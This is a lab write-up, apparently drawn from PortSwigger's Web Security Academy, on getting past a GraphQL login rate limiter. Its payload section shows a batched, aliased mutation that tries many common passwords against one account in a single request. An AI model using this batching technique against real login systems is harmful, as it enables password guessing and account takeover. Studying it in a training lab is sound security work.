## Bypassing GraphQL brute force protections

**Category:** graphql
**Difficulty:** Unknown

### Description
The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.

### Solution Steps
1. Open the lab in Burp's browser.
2. Right-click the page and select Inspect .
3. Select the Console tab.
4. Paste the script and press Enter.

### Key Payloads
- `carlos`
- `mutation {}`
- `operationName`
- `success`
- `mutation {
        bruteforce0:login(input:{password: "123456", username: "carlos"}) {
              token
              success
          }

          bruteforce1:login(input:{password: "password", username: "carlos"}) {
              token
              success
          }

    ...

          bruteforce99:login(input:{password: "12345678", username: "carlos"}) {
              token
              success
          }
    }`
- `true`

### Indicators of Success
- Introspection query returns schema
- Hidden fields/queries discovered
- Authorization bypass via GraphQL
- Batching bypasses rate limits
- Sensitive data exposed via queries
---
*Source: PortSwigger Web Security Academy*
